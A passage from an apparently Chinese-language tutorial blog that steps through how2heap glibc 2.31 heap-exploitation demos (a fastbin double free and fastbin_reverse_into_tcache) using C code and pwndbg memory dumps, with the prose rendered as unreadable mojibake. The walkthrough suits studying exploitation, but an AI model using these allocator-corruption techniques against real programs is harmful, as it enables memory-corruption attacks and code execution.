class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">        <span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">        a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-fastbin-reverse-into-tcache"><a href="#2-fastbin-reverse-into-tcache" class="headerlink" title="2. fastbin_reverse_into_tcache"></a>2. fastbin_reverse_into_tcache</h3><p>é¦–å…ˆåˆ†é…ä¸€å®šæ•°é‡çš„ chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">19</span>   <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="number">20</span>   <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="number">21</span>   <span class="keyword">size_t</span> i;</span><br><span class="line">â–º <span class="number">22</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">  <span class="number">23</span>     ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="number">24</span>   &#125;</span><br></pre></td></tr></table></figure><p>ç„¶å free å¡«å…… tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">31</span>   <span class="comment">// Fill the tcache.</span></span><br><span class="line"> â–º <span class="number">32</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">   <span class="number">33</span>     <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">   <span class="number">34</span>   &#125;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x555555559480</span> â€”â–¸ <span class="number">0x555555559430</span> â€”â–¸ <span class="number">0x5555555593e0</span> â€”â–¸ <span class="number">0x555555559390</span> â€”â–¸ <span class="number">0x555555559340</span> â€”â–¸ <span class="number">0x5555555592f0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>é‡Šæ”¾æˆ‘ä»¬çš„ç›®æ ‡ chunk å³è¿™é‡Œçš„ ptrs[7]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">  <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">  <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">  <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">  victim</span><br><span class="line">);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‡Šæ”¾å‰©ä¸‹çš„ 8-14 çš„chunk</p><p>ç„¶åå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œå¯ä»¥è¦†ç›– victim çš„å†…å®¹ï¼Œæˆ‘ä»¬æ­¤æ—¶å°† æ ˆä¸Šæ„é€ å¥½çš„ä¸€ä¸ª listçš„åœ°å€èµ‹äºˆ victim </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">75</span>   <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">   <span class="number">76</span></span><br><span class="line">   <span class="number">77</span>   <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line"> â–º <span class="number">78</span>   *(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line">   <span class="number">79</span></span><br><span class="line">   <span class="number">80</span>   <span class="comment">//------------------------------------</span></span><br><span class="line">  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p victim</span><br><span class="line">$<span class="number">1</span> = <span class="number">0x5555555594d0</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555594d0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rax  <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x7fffffffe200</span> â—‚â€” <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x5555555594d8</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ malloc 7æ¬¡ æ¸…ç©º tcache bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">86</span>   <span class="comment">// Empty tcache.</span></span><br><span class="line">   <span class="number">87</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">   <span class="number">88</span>     ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">89</span>   &#125;</span><br><span class="line">   <span class="number">90</span></span><br><span class="line"> â–º <span class="number">91</span>   <span class="built_in">printf</span>(</span><br><span class="line">   <span class="number">92</span>     <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">   <span class="number">93</span>     <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">   <span class="number">94</span>   );</span><br><span class="line">   <span class="number">95</span></span><br><span class="line">   <span class="number">96</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp  <span class="number">0x7fffffffe1e0</span> â—‚â€” <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x7fffffffe1e8</span> â—‚â€” <span class="number">0x7</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7fffffffe1f0</span> â€”â–¸ <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x7fffffffe200</span> â—‚â€” <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7fffffffe1f8</span> â—‚â€” <span class="number">0x100</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x7fffffffe200</span> â—‚â€” <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... â†“</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">55555555540</span>a main+<span class="number">481</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x5555555596a0</span> â€”â–¸ <span class="number">0x555555559650</span> â€”â–¸ <span class="number">0x555555559600</span> â€”â–¸ <span class="number">0x5555555595b0</span> â€”â–¸ <span class="number">0x555555559560</span> â—‚â€” ...</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç° fastbin çš„æœ€åä¸€ä¸ªçš„ fdè¢«æˆ‘ä»¬å†™æˆäº† stack çš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x5555555596a0</span> â€”â–¸ <span class="number">0x555555559650</span> â€”â–¸ <span class="number">0x555555559600</span> â€”â–¸ <span class="number">0x5555555595b0</span> â€”â–¸ <span class="number">0x555555559560</span> â—‚â€” ...</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555559560</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚   <span class="number">0x555555559560</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚   <span class="number">0x555555559568</span> â—‚â€” <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚   <span class="number">0x555555559570</span> â€”â–¸ <span class="number">0x555555559510</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚   <span class="number">0x555555559578</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555559510</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚   <span class="number">0x555555559510</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚   <span class="number">0x555555559518</span> â—‚â€” <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚   <span class="number">0x555555559520</span> â€”â–¸ <span class="number">0x5555555594c0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚   <span class="number">0x555555559528</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555594c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚   <span class="number">0x5555555594c0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚   <span class="number">0x5555555594c8</span> â—‚â€” <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚   <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x7fffffffe200</span> â—‚â€” <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚   <span class="number">0x5555555594d8</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬ malloc ä¸€æ¬¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">*RAX  <span class="number">0x5555555596b0</span> â€”â–¸ <span class="number">0x555555559650</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"> RBX  <span class="number">0x555555555570</span> (__libc_csu_init) â—‚â€” endbr64</span><br><span class="line">*RCX  <span class="number">0x7ffff7fb0ba8</span> (main_arena+<span class="number">40</span>) â—‚â€” <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">*RDX  <span class="number">0x555555559016</span> â—‚â€” <span class="number">0x7</span></span><br><span class="line">*RDI  <span class="number">0x6</span></span><br><span class="line">*RSI  <span class="number">0x0</span></span><br><span class="line">*R8   <span class="number">0x5555555596b0</span> â€”â–¸ <span class="number">0x555555559650</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">*R9   <span class="number">0x18</span></span><br><span class="line">*R10  <span class="number">0x555555559028</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"> R11  <span class="number">0x246</span></span><br><span class="line"> R12  <span class="number">0x555555555140</span> (_start) â—‚â€” endbr64</span><br><span class="line"> R13  <span class="number">0x7fffffffe3a0</span> â—‚â€” <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffe2b0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffe1e0</span> â—‚â€” <span class="number">0x34000000340</span></span><br><span class="line">*RIP  <span class="number">0x55555555548c</span> (main+<span class="number">611</span>) â—‚â€” mov    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">0</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   <span class="number">0x555555555473</span> &lt;main+<span class="number">586</span>&gt;    lea    rdi, [rip + <span class="number">0x108e</span>]</span><br><span class="line">   <span class="number">0x55555555547a</span> &lt;main+<span class="number">593</span>&gt;    call   <span class="built_in">puts</span>@plt &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x55555555547f</span> &lt;main+<span class="number">598</span>&gt;    mov    eax, <span class="number">0x40</span></span><br><span class="line">   <span class="number">0x555555555484</span> &lt;main+<span class="number">603</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x555555555487</span> &lt;main+<span class="number">606</span>&gt;    call   <span class="built_in">malloc</span>@plt &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line"></span><br><span class="line"> â–º <span class="number">0x55555555548c</span> &lt;main+<span class="number">611</span>&gt;    mov    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">0</span></span><br><span class="line">   <span class="number">0x555555555497</span> &lt;main+<span class="number">622</span>&gt;    jmp    main+<span class="number">694</span> &lt;main+<span class="number">694</span>&gt;</span><br><span class="line">    â†“</span><br><span class="line">   <span class="number">0x5555555554df</span> &lt;main+<span class="number">694</span>&gt;    cmp    qword ptr [rbp - <span class="number">0xc8</span>], <span class="number">5</span></span><br><span class="line">   <span class="number">0x5555555554e7</span> &lt;main+<span class="number">702</span>&gt;    jbe    main+<span class="number">624</span> &lt;main+<span class="number">624</span>&gt;</span><br><span class="line">    â†“</span><br><span class="line">   <span class="number">0x555555555499</span> &lt;main+<span class="number">624</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0xc8</span>]</span><br><span class="line">   <span class="number">0x5555555554a0</span> &lt;main+<span class="number">631</span>&gt;    mov    rax, qword ptr [rbp + rax*<span class="number">8</span> - <span class="number">0xb0</span>]</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">115</span>     <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">   <span class="number">116</span>   );</span><br><span class="line">   <span class="number">117</span></span><br><span class="line">   <span class="number">118</span>   <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">119</span></span><br><span class="line"> â–º <span class="number">120</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="number">121</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">   <span class="number">122</span>   &#125;</span><br><span class="line">   <span class="number">123</span></span><br><span class="line">   <span class="number">124</span>   <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span 